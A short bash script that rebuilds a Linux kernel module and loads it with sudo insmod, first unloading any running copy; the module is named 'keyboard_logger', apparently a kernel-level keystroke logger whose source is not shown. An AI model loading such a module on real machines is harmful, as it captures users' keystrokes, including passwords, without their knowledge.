#!/bin/bash

make clean 
make
if lsmod | grep -wq "keyboard_logger"; then
	sudo rmmod keyboard_logger
fi
sudo insmod keyboard_logger.ko
